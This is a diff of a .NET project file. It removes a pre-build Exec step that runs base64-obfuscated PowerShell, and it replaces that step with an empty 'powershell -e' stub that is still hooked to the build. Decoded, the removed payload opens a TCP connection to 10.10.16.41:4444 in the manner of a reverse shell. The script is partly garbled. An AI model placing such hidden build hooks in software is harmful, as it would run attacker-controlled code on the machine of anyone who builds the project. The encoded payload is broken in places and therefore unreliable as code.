@@ -7,7 +7,7 @@
     <Nullable>enable</Nullable>
   </PropertyGroup>
     <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
-        <Exec Command="powershell -Command 'powershell -e TmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgiMC4xMDAuMS40IiwgOTAwMCk7JHN0YXJ0ID0gJGNsaWVuCnQuR2V0U3RyZWFtKCkuVENQQ2xpZW50KCIkMTAuMTAuMTYuNDEiLCA0NDQ0KTskc3RyZWFtID0gJGNsaWVudC5HZXRTdHJlYW0oKTtbYnl0ZVtdXSRieXRlcyA9IDAuLjY1NTM1fCV7MH07d2hpbGUoKCRpID0gJHN0cmVhbS5SZWFkKCRieXRlcywgMCwgJGJ5dGVzLkxlbmd0aCkpIC1uZSAwKXskZGF0YSA9IChbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKSsgImByYG4iKTskc3RyZWFtLldyaXRlKCRieXRlcywgMCwgJGJ5dGVzLkxlbmd0aCk7fSRjbGllbnQuQ2xvc2UoKQo='" />
+        <Exec Command="powershell -Command 'powershell -e '" />
     </Target>
 
 </Project>
